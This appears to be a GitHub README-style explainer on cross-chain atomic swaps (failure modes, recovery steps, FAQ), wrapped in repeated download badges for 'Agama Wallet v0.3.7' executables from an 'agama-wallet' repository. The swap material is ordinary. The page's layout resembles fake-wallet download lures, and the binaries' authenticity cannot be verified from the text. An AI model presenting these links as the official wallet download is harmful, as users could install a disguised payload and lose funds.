[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Cross-Chain Swaps: What They Are and Where They Fail

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A cross-chain swap exchanges an asset on one blockchain for an asset on another without either party holding the other's funds in the middle. The two legs settle independently, tied together by a shared secret and two deadlines. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it is one interface for trades of exactly this shape.

## You'll see this if

You are moving value between two chains and the options are an exchange account, a bridge, or a swap from your own wallet. Or a cross-chain trade has stalled with one leg locked and the other missing.

| Approach | Who holds funds mid-trade | Failure mode |
|---|---|---|
| Exchange account | The exchange | Withdrawal limits, account freezes, counterparty risk |
| Bridge | A contract or validator set | Contract risk, validator collusion, wrapped-asset risk |
| Atomic swap | Nobody | A stalled leg, resolved by timeout |
| Wrapped asset | The custodian of the backing | Depeg if the backing is not honoured |

## Why it happens

Each chain validates only its own transactions, so a trade across two of them cannot be one atomic operation in the database sense. It has to be made atomic by construction: the claim on one chain reveals the value needed to claim on the other.

That construction has a physical consequence. Two chains produce blocks on different schedules, so the trade's duration is the sum of both, not the maximum. It also means both legs need fees in their own native assets, and that a wallet must be able to build and broadcast on both.

Where cross-chain swaps fail, it is usually one of three things:

- **Liquidity.** The pair has no counterparty, so the order waits. This is the most common and least alarming failure.
- **Timing.** One chain confirms slowly and the deadline margin proves too tight for the other party to claim.
- **Interface.** A wallet that loses track of the second leg's state cannot tell the user which path is open.

## Fix

When a cross-chain swap stalls, identify which leg is where before doing anything.

1. **Establish what is locked and on which chain.** Two hashes, two deadlines, two states.
2. **Check the slower chain first.** A leg that looks missing is often unconfirmed rather than genuinely absent, and the explorer's confirmation count is the figure to check.
3. **Compare each deadline to its own chain's height.** Block production differences make wall-clock comparisons useless.
4. **Claim the leg you are entitled to as soon as its secret is public.** Do not wait for the interface to prompt you.
5. **Use the refund path on any leg whose deadline passed.** It is a transaction with a fee, not an automatic reversal.

The mechanism is set out step by step in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md), and the contract in [HTLC explained](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md).

## If that did not work

If a leg never appeared at all, the counterparty did not lock, and nothing you do on your side changes that. The refund path is the only outcome, and it opens at your deadline.

If both legs locked but neither claimed, someone has to act: the secret is known only to the party who chose it, and until they claim it, the other side cannot. This is the one scenario where the trade depends on a counterparty doing something after locking.

If a bridge would have been faster, that is true and beside the point: speed and custody are the trade-off. [Atomic swaps vs bridges](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md) compares them directly.

If a cross-chain swap is offered with no counterparty at all, check carefully what is actually being traded. A service that accepts your coin and sends another is a custodial exchange with a friendly interface, not a swap.

## Prevention

- **Prefer pairs with visible liquidity.** Thin books are the main cause of long waits.
- **Hold fees on both chains.** A swap needs at least two transactions per side.
- **Start with a small trade on an unfamiliar pair.** It reveals the timing without much at stake.
- **Record both deadlines at the start.** They are the only times that matter later.
- **Read what the wallet is actually doing.** [No-KYC swaps](https://github.com/agama-wallet/atomic-swaps/blob/main/what-no-kyc-means.md) covers what privacy a peer-to-peer trade does and does not provide, and what the chain still shows afterwards.

## FAQ

### Is a cross-chain swap the same as a bridge?

No. A swap exchanges ownership between two parties with no custodian; a bridge moves or represents an asset across chains, usually through a contract or a validator set that must be trusted.

### Can a cross-chain swap move a token that only exists on one chain?

Only if the other side accepts a representation of it, which is a bridge or a wrapped asset rather than a swap of native coins.

### Why do cross-chain swaps take longer than single-chain trades?

Because two chains must each confirm at least two transactions, and the slower chain sets the pace. The maker of Agama Wallet estimates 5 to 30 minutes for a typical swap, and a congested chain can push that out considerably.

### Do both parties need the same wallet?

No. They need implementations of the same swap protocol, which usually means agreeing on the hash, the two deadlines and the transaction formats. Different wallets that speak the same protocol can trade, which is why the protocol matters more than the interface.

### What happens if one chain halts?

The deadlines still apply, but they are measured in blocks that are not being produced. A halted chain pauses the trade rather than resolving it, and the outcome depends on which side resumes first.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Atomic Swaps vs Bridges: Two Ways to Move Value Across Chains](https://github.com/agama-wallet/atomic-swaps/blob/main/bridges-and-their-tradeoffs.md)
- [No-KYC Crypto Swaps: What "No KYC" Actually Means](https://github.com/agama-wallet/atomic-swaps/blob/main/what-no-kyc-means.md)
- [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md)
